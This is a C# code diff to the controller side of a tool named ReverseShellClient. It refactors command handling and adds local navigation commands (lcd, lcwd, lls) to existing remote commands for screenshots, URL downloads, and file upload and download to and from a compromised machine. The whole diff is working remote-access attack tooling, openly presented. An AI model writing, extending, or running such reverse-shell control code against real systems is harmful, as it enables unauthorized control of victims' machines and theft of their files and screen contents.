@@ -74,7 +74,7 @@ namespace ReverseShellClient
             var runClient = new Task(RunClient);
             runClient.Start();
 
-            ProcessKeys();
+            ProcessInput();
         }
 
 
@@ -112,8 +112,8 @@ namespace ReverseShellClient
                         case "{ReceiveFileFromClient:init}":
                             tools.UploadFile(toolsFilePath);
                             break;
-                        case "{UploadToClient:init}":
-                            tools.ReceiveFile(toolsFilePath);
+                        case "{UploadFileToClient:init}":
+                            tools.DownloadFile(toolsFilePath);
                             break;
                         default:
                             // Normal output (text)
@@ -146,7 +146,7 @@ namespace ReverseShellClient
         }
 
 
-        void ProcessKeys()
+        void ProcessInput()
         {
             while (true)
             {
@@ -183,13 +183,13 @@ namespace ReverseShellClient
                         streamWriter.WriteLine(command);
                         streamWriter.Flush();
                     }
-                    else if (result == "fileError")
-                    {
-                        ConsoleColorTools.WriteCommandError("The specified file doesn't exist");
-                    }
-                    else
+                    else if (result == "syntaxError")
                     {
                         ConsoleColorTools.WriteError("Syntax error");
+                    }
+                    else if (result == "fileError")
+                    {
+                        ConsoleColorTools.WriteCommandError("The specified folder / file doesn't exist");
                     }
                 }
             }
@@ -199,25 +199,46 @@ namespace ReverseShellClient
         string PreProcessCommand(ref string command)
         {
             var result = "ok";
+            var commandPart = command.Split(' ')[0];
 
             if (command == "ls")
             {
                 command = "dir";
             }
-            else if (command == "#screenshot" || command.Split(' ')[0] == "#downloadurl" || command.Split(' ')[0] == "#upload" || command.Split(' ')[0] == "#download")
+            else if (commandPart == "#screenshot" || commandPart == "#downloadurl" || commandPart == "#upload" || commandPart == "#download" || commandPart == "lcd" || commandPart == "lcwd" || commandPart == "lls")
             {
-                if (command != "#screenshot")
+                if (commandPart != "#screenshot")
                 {
                     if (command.Split(' ').Length == 2)
                     {
-                        if (command.Split(' ')[0] == "#upload" || command.Split(' ')[0] == "#download")
+                        var argumentPart = command.Split(' ')[1];
+                        if (commandPart == "#upload" || commandPart == "#download")
                         {
-                            toolsFilePath = command.Split(' ')[1];
-                            if (!tools.CheckForFileExist(toolsFilePath, command.Split(' ')[0] == "#upload"))
+                            // Local file exists for upload ?
+                            if (commandPart == "#upload" && !File.Exists(argumentPart))
                             {
                                 result = "fileError";
                             }
+                            else
+                            {
+                                toolsFilePath = argumentPart;
+                            }
                         }
+                        else if (commandPart == "lcd")
+                        {
+                            tools.lcd(argumentPart);
+                            result = "localCommand";
+                        }
+                    }
+                    else if (commandPart == "lcwd")
+                    {
+                        tools.lcwd();
+                        result = "localCommand";
+                    }
+                    else if (commandPart == "lls")
+                    {
+                        tools.lls();
+                        result = "localCommand";
                     }
                     else
                     {
